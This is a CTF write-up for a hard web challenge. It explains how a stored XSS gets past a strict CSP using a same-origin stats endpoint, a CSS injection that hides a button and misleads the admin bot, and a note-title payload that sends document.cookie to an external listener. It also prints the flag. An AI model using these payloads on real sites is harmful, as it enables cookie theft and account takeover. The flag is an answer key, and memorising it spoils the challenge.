---
title: "crazy notes"
ctf: "Friendly CTF 2026"
date: 2026-09-28
category: web
difficulty: hard
author: "L-BOH"
---

# crazy notes

## Summary

This is a stored XSS challenge with a strict Content Security Policy. The solution turns a user-controlled note title into JavaScript served from the same origin, forces the admin bot to visit the unsafe profile page, and navigates the bot to a listener with its flag cookie.

## Vulnerable code

The profile template disables escaping at [src/app/templates/profile.html](src/app/templates/profile.html), line 19:

~~~jinja
<p class="muted">{{ bio | safe }}</p>
~~~

Normally, a script in the bio would be blocked by the CSP defined in [src/app/app.py](src/app/app.py), line 12, because script-src only permits the same origin and DOMPurify's CDN.

There is a same-origin script gadget at [src/app/app.py](src/app/app.py), lines 202-215:

~~~python
c.execute('SELECT id, title, visit_count FROM notes WHERE id=?', (note_id,))
...
return f"Note: {note[1]}, Visit Count: {note[2]}"
~~~

The title is user controlled and is returned without JavaScript escaping. The response also lacks X-Content-Type-Options, allowing the browser to treat a valid JavaScript-looking response as a script when loaded with a script src tag.

Finally, a stored CSS injection makes the bot take its error path. The color is saved without validation at [src/app/app.py](src/app.py), lines 170-180, and inserted into a style attribute at [src/app/templates/notes.html](src/app/templates/notes.html), line 25:

~~~html
<button id="view-btn" ... style="background-color: {{ color_input }}">View Random Note</button>
~~~

The bot tries to click this element. If the click times out, [src/bot/bot.js](src/bot/bot.js), lines 50-60, sends the logged-in admin to the attacker profile.

## Exploit

Assume your user ID is USER_ID and the note ID is NOTE_ID.

1. Save this button color:

~~~text
red;display:none
~~~

The rendered style becomes background-color red followed by display none, hiding the button. For example:

~~~bash
curl -b cookies.txt -X POST \
  https://crazy-notes.web2.friendly-ctf.securinets.tn/user/USER_ID/preferences/button-color \
  --data-urlencode 'color=red;display:none'
~~~

2. Create a note with any content and this title, replacing LISTENER with a request bin or your server:

~~~javascript
;window.location='https://LISTENER/?c='+encodeURIComponent(document.cookie);//
~~~
this would bypass the csp cz the navigate-to directive was not defined and set to self for exp to block navigation to external servers

3. Set your bio to:

~~~html
<script src="/note/NOTE_ID/stats"></script>
~~~

This satisfies script-src because the script URL is on the target origin. The stats endpoint returns source beginning with:

~~~javascript
Note: ;window.location='https://LISTENER/?c='+encodeURIComponent(document.cookie);//
~~~

The initial Note label is valid JavaScript and the leading semicolon starts the payload. The final double slash comments out the rest of the stats text.

4. Trigger the admin bot from the profile page. It first opens your notes, cannot click the hidden button, catches a timeout, and then visits your profile. The profile loads the same-origin gadget and the JavaScript navigates to your listener with the flag cookie.

The CSP blocks fetch requests to external origins through connect-src, but it does not restrict top-level navigation here. The policy also has no effective navigation restriction, so assigning window.location works.

## Flag

~~~text
Securinets{s0me_fun_f0r_xss_f4ns}
~~~
